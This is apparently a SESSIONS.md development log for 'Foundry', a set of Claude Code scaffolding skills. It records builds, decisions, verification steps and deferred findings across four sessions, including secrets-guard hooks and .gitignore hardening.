- **5 of the remaining HIGH/MEDIUM findings fixed**: a mandatory pre-migration diff check before any "full re-render" of an existing doc (prevents lossy reformatting even when the user consents to a redo); collaborator/shared-repo checks tightened before recommending git history rewrite; sequencing ambiguity between `foundry-repo-hygiene` and `foundry-security`'s `.gitignore` step clarified; explicit "no parallel sub-skill execution" stated for the shared `{{ADDITIONAL_RULES}}` write; a documented re-enable path for a dismissed status hook (confirmed against the actual hook logic — `scaffolded` is checked before `dismissed`, so re-running `/foundry-init` is sufficient, no separate "undismiss" needed).
- **2 findings extended into a real mechanism rather than just fixed in place**: added `foundry.scaffoldMode` ("minimal" vs. "full") written by `foundry-init`, and wired `foundry-repo-hygiene`'s existing freshness-check skill to flag (a) a "minimal"-mode project that may have outgrown that original choice, and (b) a REGULATORY CONTEXT section whose stated date is getting old — neither existed as a mechanism before, only as static content with no periodic recheck.
- **2 lower-severity findings deferred to roadmap, not silently dropped**: hardening the SessionStart hook templates' shell substitution against unquoted word-splitting (safe today since filenames are hardcoded, flagged as a latent issue if ever generalized), and `foundry-stack` cross-checking CLAUDE.md's compliance section for confidentiality language before offering portfolio tracking.

### What was decided
- Confirmed (don't just assume) every fix by reproducing the failure first, then testing the fix against an adversarial fixture set in both directions — not just the one case that was reported. This caught additional gaps the independent review itself didn't surface (e.g. the `.gitignore` glob version of the regex fix initially still had its own distinct false-positive on `secretary_notes.txt`, found only by testing it separately rather than assuming the regex fix's logic would transfer).
- Treated the independent review's findings as a real audit, not a suggestion box: every CRITICAL/HIGH finding was either fixed or explicitly, visibly deferred with a stated reason — none were silently dropped, per the user's explicit request to "cover our butts in documentation as well."
- This entire session was prompted by the user catching two real risks (existing-file overwrite, wrong-directory scaffolding) that had not been caught despite this tool already having gone through two prior build sessions and an end-to-end test — a concrete demonstration of why a second, differently-motivated reviewer (human or a fresh agent) catches things the original builder's familiarity blinds them to.

### Verification
- Both CRITICAL regex/glob fixes verified against real adversarial fixture sets (18-25 files each, covering both false-negative and false-positive directions) using the actual commands as they appear in the skill files, not simplified versions.
- The location-safety command verified against two real directories on this machine: returns 0 in an actual project root, 4 in an actual multi-project container.
- The broader historical-secrets-scan command verified against a real private repo to confirm it produces a usable, non-noisy candidate list.
- The `foundry.dismissed`/`foundry.scaffolded` re-enable claim verified by re-reading the actual hook template's conditional logic, not assumed from memory.

### What to do first next session
- The remaining un-actioned medium/low findings are now tracked in README.md's Roadmap — pick up from there.
- Still the standing top priority from prior sessions: run `/foundry-init` on a real, non-scratch project for the first time.
- Design and build the standalone fresh-context QC/adversarial-review skill (see addendum below and DECISIONS.md) — formalizing the exact process just used on Foundry itself.

### Addendum — QC/review skill positioned as referenced, not owned
- Right after this session's independent review proved valuable, the user asked whether it should become a permanent built-in part of Foundry. Decided no, for the same reason Promptify isn't owned by `foundry-init`: it's a fundamentally different capability (deep content/code review, not scaffolding) and baking it in would blur Foundry's scope. Added it to README.md's Roadmap as its own future standalone skill, and added a forward-looking note in `foundry-init`'s Step 3 describing the intended integration (Foundry surfaces it once it exists, doesn't own or auto-invoke it) — without claiming it's available yet, since it isn't built. Full reasoning in DECISIONS.md.

---

## 2026-06-28 (Session 3 — license, public-release readiness)

### What was built
- Added `LICENSE` (MIT) and updated README.md's License section to point to it.
- Decided public/open-source over private: no competitive/business reason to keep this private, and openness directly supports the stated goal of building a track record. The only counterargument was wanting more polish time first, which is a timing preference, not a security concern — addressed by keeping the README/CLAUDE.md honest about current verification gaps rather than waiting.

### Verification
- N/A — documentation/licensing change only, no code/hook logic touched.

### What to do first next session
- The real next milestone: run `/foundry-init` on an actual project, not a scratch directory.

---

## 2026-06-28 (Session 2 — STACK.md, status hook, context-checkpoint rule)

### What was built
- **`foundry-stack` skill + `STACK.md.template`** (new 8th skill): career/portfolio tech-stack tracking, distinct in audience and lifecycle from CLAUDE.md/DECISIONS.md/SESSIONS.md. Modeled directly on a proven real pattern from one of the user's other projects, rather than invented from scratch — same section structure (current stack table, planned/not-yet-built, version snapshots with "what this demonstrates," skills-gap-vs-job-postings, ready-to-paste resume bullet). Added a mandatory why-linkage rule after the user flagged that an early draft only covered what/when, not why: every non-trivial row must state the alternative/reason inline or cross-reference the relevant DECISIONS.md entry by date. Wired into `foundry-init`'s questionnaire (`TRACK_STACK` flag) and call sequence.
- **Status/offer SessionStart hook** (`templates/settings.status.json.template`, Hook 3 in `foundry-hooks`): three states — scaffolded (silent "Foundry: Active (scaffolded <date>)"), dismissed (completely silent), neither (one-line offer to run `/foundry-init`). `foundry.scaffolded`/`scaffoldedDate` are written by `foundry-init` on successful completion (Step 2.5); `foundry.dismissed` is written by a new dismiss path if the user declines the offer. The status hook itself only reads these fields, never writes them.
- **Context-checkpoint rule** added to `CLAUDE.md.template`'s standing Rules: proactively suggest a SESSIONS.md/memory update plus `/clear` when a session has drifted across many unrelated subtasks or run long — prompted by the user asking whether Foundry enforces good context-management practice, noticing in the moment that this very build session hadn't been proactively flagged for a checkpoint despite running long across several different subtasks.
- Roadmap additions (correctly deferred, documented rather than dropped): `foundry-update` (pulling template improvements into an already-scaffolded project), a persistent `statusLine` indicator as an alternative/complement to the SessionStart-only status message, and a note on multi-machine dismiss-state consistency if that state ever moves to personal/gitignored settings.

### What was decided
See DECISIONS.md for full entries. Summary: STACK.md built in full now rather than as a placeholder, because the per-project record is the data layer any future job-hunting tool would need regardless; the cross-project rollup stayed correctly out of scope. The status hook needed three states, not a binary, to avoid being either presumptuous (re-offering on an already-scaffolded project) or naggy (re-offering after an explicit decline). The context-checkpoint rule is framed around recognizing drift/scope sprawl, not a fixed context-percentage threshold, since the real mechanism that keeps long-running work reliable is re-anchoring on the docs after a clear, not hitting a specific number.

### Verification
- `foundry-stack`/STACK.md.template: hand-rendered against a real project's actual history (an earlier debugging session's findings) at the same quality bar as the reference pattern it's modeled on; confirmed the why-linkage rule produces genuinely interview-worthy notes, not technology-name restatements.
- Status hook: all three states (scaffolded/dismissed/neither) tested with the real, JSON-embedded extracted command (not the unescaped logic) against scratch `.claude/settings.json` files, then verified again against Foundry's own real merged settings.json (both the doc-loader hook and the new status hook firing correctly together in the same `SessionStart` array).
- Confirmed multiple independent `SessionStart` hook entries coexist correctly in the same array (tested directly) before relying on that to add Hook 3 alongside Hook 1 rather than needing to merge their commands into one.

### What to do first next session
- Run `/foundry-stack` through a real Skill-tool invocation (not hand-simulated) to close that verification gap.
- Run the dismiss path (`foundry-init`'s "Dismissing the status hook's offer" section) through a real invocation to confirm `foundry.dismissed` actually gets written correctly, not just designed.
- Continue with the carry-over priorities from Session 1 (promptify exercise, license decision).

---

## 2026-06-28 (Session 1 — initial build)

### What was built
- Full repo skeleton: `skills/` (7 skills), `templates/` (4 templates), `docs/`, `install.sh`, `README.md`.
- **Doc templates**: `CLAUDE.md.template` (fixed core + 3 conditional sections gated by `HANDLES_SECRETS`/`REGULATED`/`HANDLES_DATA_OR_MONEY` flags), `DECISIONS.md.template` and `SESSIONS.md.template` (header/schema only, no placeholders — these accumulate entries over a project's life rather than being filled once).
- **`foundry-docs`**: renders the templates, asks the questionnaire if not already answered by a calling skill.
- **`foundry-hooks`**: generates the SessionStart doc-loader hook (parameterized by which docs actually exist) and an optional secrets-guard `PreToolUse`/`Bash` hook for `git commit`.
- **`foundry-security`**: `.gitignore` baseline, `.env.example` convention, a check for already-committed secrets in git history (with rotate-before-scrub sequencing).
- **`foundry-repo-hygiene`** (added mid-build, not in the original plan): new-repo commit sequencing (`.gitignore` before first `git add`) and an ongoing docs-freshness discipline/check — added after the user flagged that git/repo setup hygiene needed to be a first-class, explicit concern rather than implicit in other skills.
- **`foundry-governance`**: regulatory/compliance section content, with a hard rule against fabricating plausible-sounding compliance language — defaults to an explicit "not yet researched" placeholder instead.
- **`foundry-init`**: thin orchestrator; fast-path check for throwaway scripts, full questionnaire otherwise, calls the other skills in dependency order.
- **`promptify`**: standalone skill, `/promptify` (review-first) and `/promptify!` (execute immediately), with a mandatory explanation of what changed and why on every rewrite — explicitly not embedded into foundry-init, designed to be extractable as its own tool later.
- **`install.sh`**: symlinks `skills/*` into `~/.claude/skills/`.
- **`EXPLAIN_MODE` convention** (added after the user flagged that new/less-experienced developers need help understanding *why*, not just *what*, by default): `foundry-init` asks up front whether to use brief or detailed/educational explanations; each of the 5 sub-skills got a short note instructing it to surface its own already-documented reasoning to the user in detailed mode. Deliberately scoped small — this surfaces existing reasoning rather than building a new adaptive-help system, since the latter would have meaningfully expanded this build's scope.

### What was decided
See DECISIONS.md for full entries. Summary: Foundry stays the tool name, "Preamble" becomes the brand umbrella for later; configuration is derived from a questionnaire rather than named presets; proactive review agents are deferred to the roadmap rather than built now; governance sections default to honest gaps rather than generic compliance filler; no third-party skill packs bundled without independent verification.

### Verification
- `foundry-docs`: hand-rendered the template against two scratch scenarios (minimal personal script; regulated fintech project) and confirmed the conditional `<!-- IF -->` blocks correctly include/exclude the right sections.
- `foundry-hooks`: the generated SessionStart hook command was pipe-tested with synthetic stdin (`echo '{}' | bash -c "<command>"`), validated as well-formed JSON via `jq -e`, and confirmed to degrade gracefully (skip missing files without erroring) when not all three docs exist yet.
- `foundry-security`: the `.gitignore` merge-don't-duplicate logic was tested twice in a row in a scratch repo to confirm idempotency (8 lines both times, no duplicates). The secrets-guard detection pattern was tested against a real scratch git repo: correctly blocked when `.env` was staged, correctly allowed when only a safe file was staged.
- `foundry-repo-hygiene`: the docs-freshness `git log -1 --format=%ci` pattern was run against a real existing private repo and produced a real, interpretable timestamp gap, not just syntactically-valid-but-meaningless output.
- `foundry-init`: ran an actual end-to-end test by invoking the Skill tool directly (not hand-simulated) against two real scratch directories — a throwaway CSV-to-JSON script and a regulated fintech compliance tool ("ComplianceBot"). Confirmed: the minimal scenario produced exactly 1 file with 3 sections; the regulated scenario produced 4 files (including a validated `.claude/settings.json` hook) with 14 sections, including a governance section that correctly stated "NOT YET RESEARCHED" rather than fabricating SEC-specific compliance language.
- `install.sh`: run for real (not dry-run) — confirmed all 7 skills symlinked correctly, confirmed idempotent on a second run, and confirmed via the harness's own system reminder that all 7 skills were recognized and listed as available immediately afterward.

### What to do first next session
- Confirm repo name/visibility with the user, then push the initial commit (this session ends before that step — see KNOWN DEBT in CLAUDE.md).
- Exercise `/promptify` against a handful of real rough prompts — its shape-classification logic has been designed but not yet run against real varied input.
- Decide on a license before any public announcement.
- Consider whether the Markdown-instruction approach to template rendering (asking the model to follow IF-block stripping steps) holds up well after more real-world use, or whether a literal parsing script would be more reliable at scale.
